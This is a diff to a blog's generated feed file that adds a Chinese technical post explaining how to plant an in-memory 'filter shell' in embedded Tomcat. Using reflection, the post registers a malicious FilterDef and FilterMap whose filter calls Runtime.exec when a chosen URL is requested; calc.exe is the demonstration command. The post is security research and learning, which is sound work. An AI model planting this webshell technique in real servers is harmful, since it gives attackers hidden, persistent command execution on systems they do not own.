@@ -4,6 +4,27 @@
   
   
   <entry>
+    <title>Java Tomcat Filter 内存马</title>
+    <link href="/2022/09/03/Java-Tomcat-Filter-%E5%86%85%E5%AD%98%E9%A9%AC/"/>
+    <url>/2022/09/03/Java-Tomcat-Filter-%E5%86%85%E5%AD%98%E9%A9%AC/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>老技术，进行一波学习。</p><a id="more"></a><hr><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>随便搞个SpringBoot环境，里面集成了tomcat。</p><h3 id="FilterChain生成"><a href="#FilterChain生成" class="headerlink" title="FilterChain生成"></a>FilterChain生成</h3><p>以前读tomcat代码的时候能看到调用的FilterChain由ApplicationFilterFactory类生成，首先从context中取出filtermaps：</p><pre><code class="java">FilterMap[] filterMaps = context.findFilterMaps();</code></pre><p>其来自context里的filterMaps属性：</p><pre><code class="java">public FilterMap[] findFilterMaps() {    return this.filterMaps.asArray();}</code></pre><p>可以使用其addFilterMap函数进行添加：</p><pre><code class="java">public void addFilterMap(FilterMap filterMap) {    this.validateFilterMap(filterMap);    this.filterMaps.add(filterMap);    this.fireContainerEvent(&quot;addFilterMap&quot;, filterMap);}</code></pre><p>其参数为FilterMap对象，这个对象可以通过无参构造函数生成。为了注入我们的filter，我们首先要找到该context：</p><p><img src="/css/images/filterShell/2022090301.png" srcset="/img/loading.gif" alt=""></p><p>在Thread.currentThread()里面可以找到这个context：</p><p><img src="/css/images/filterShell/2022090302.png" srcset="/img/loading.gif" alt=""></p><p>它在TomcatEmbeddedWebappClassLoader类的resources属性中：</p><pre><code class="java">protected WebResourceRoot resources = null;</code></pre><p>但它是个protected属性，如果通过反射来获取就太麻烦了，然而问题是该9.0.65版本版本的tomcat里面用于获取resources属性的getResources函数已经用不了了：</p><pre><code class="java">@Deprecatedpublic WebResourceRoot getResources() {    return null;}</code></pre><p>没办法，还是只能反射了。</p><pre><code class="java">ClassLoader cl = Thread.currentThread().getContextClassLoader();StandardRoot resources = null;try {    Field f = cl.getClass().getSuperclass().getSuperclass().getDeclaredField(&quot;resources&quot;);    f.setAccessible(true);    resources = (StandardRoot)f.get(cl);}catch (Exception e) {    // pass}if (resources == null) {    return;}StandardContext context = (StandardContext)resources.getContext();FilterMap filterMap = new FilterMap();context.addFilterMap(filterMap);</code></pre><p>报错：</p><pre><code>java.lang.IllegalArgumentException: Filter mapping specifies an unknown filter name [null]</code></pre><p>添加上filterName再试试：</p><pre><code class="java">filterMap.setFilterName(&quot;filterShell&quot;);</code></pre><p>还是报错：</p><pre><code>java.lang.IllegalArgumentException: Filter mapping specifies an unknown filter name [filterShell]</code></pre><p>看看报错点：</p><pre><code class="java">String filterName = filterMap.getFilterName();String[] servletNames = filterMap.getServletNames();String[] urlPatterns = filterMap.getURLPatterns();if (findFilterDef(filterName) == null) {    throw new IllegalArgumentException        (sm.getString(&quot;standardContext.filterMap.name&quot;, filterName));}</code></pre><p>看起来还要先添加filterDef，看看findFilterDef函数怎么写的：</p><pre><code class="java">@Overridepublic FilterDef findFilterDef(String filterName) {    synchronized (filterDefs) {        return filterDefs.get(filterName);    }}</code></pre><p>键值从filterDef的filterName里来：</p><pre><code class="java">@Overridepublic void addFilterDef(FilterDef filterDef) {    synchronized (filterDefs) {        filterDefs.put(filterDef.getFilterName(), filterDef);    }    fireContainerEvent(&quot;addFilterDef&quot;, filterDef);}</code></pre><p>再改改代码：</p><pre><code class="java">filterDef.setFilterName(&quot;filterShell&quot;);</code></pre><p>报错：</p><pre><code>java.lang.IllegalArgumentException: Filter mapping must specify either a &lt;url-pattern&gt; or a &lt;servlet-name&gt;</code></pre><p>filterMap还需要设置url-pattern：</p><pre><code class="java">filterMap.addURLPattern(&quot;/filterShell&quot;);</code></pre><p>访问一下这个路由，发现404报错，再调试一下，发现问题出在这一句：</p><pre><code class="java">ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)        context.findFilterConfig(filterMap.getFilterName());</code></pre><p>跟进findFilterConfig函数可以发现是没有添加filterConfig：</p><pre><code class="java">public FilterConfig findFilterConfig(String name) {    return filterConfigs.get(name);}</code></pre><p>看看context中的代码，只有一句添加filterConfig的代码在filterStart函数里：</p><pre><code class="java">String name = entry.getKey();...try {    ApplicationFilterConfig filterConfig =            new ApplicationFilterConfig(this, entry.getValue());    filterConfigs.put(name, filterConfig);}</code></pre><p>发现ApplicationFilterConfig的构造函数报错，跟踪一下：</p><pre><code class="java">if (filterDef.getFilter() == null) {    getFilter();} else {    this.filter = filterDef.getFilter();    context.getInstanceManager().newInstance(filter);    initFilter();}</code></pre><p>发现原因是filterDef里面没有设置对应的Filter对象，那就新建一个Filter对象：</p><pre><code class="java">class ShellFilter implements Filter {    @Override    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException {        java.lang.Runtime.getRuntime().exec(&quot;calc.exe&quot;);    }}</code></pre><p>再通过setFilter添加到filterDef里面，访问/添加filter shell后再访问/filterShell，成功执行命令。</p><hr><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://xz.aliyun.com/t/9755" target="_blank" rel="noopener">https://xz.aliyun.com/t/9755</a></p><p><a href="https://xz.aliyun.com/t/10196" target="_blank" rel="noopener">https://xz.aliyun.com/t/10196</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+      <tag>Java</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>指针分析工具Doop安装与使用</title>
     <link href="/2022/08/08/%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7Doop%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
     <url>/2022/08/08/%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7Doop%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
@@ -242,9 +263,9 @@
       
       <tag>反序列化</tag>
       
-      <tag>JRMP</tag>
-      
       <tag>JNDI</tag>
+      
+      <tag>JRMP</tag>
       
     </tags>
     
@@ -1849,9 +1870,9 @@
       
       <tag>反序列化</tag>
       
-      <tag>JRMP</tag>
-      
       <tag>JNDI</tag>
+      
+      <tag>JRMP</tag>
       
     </tags>
     
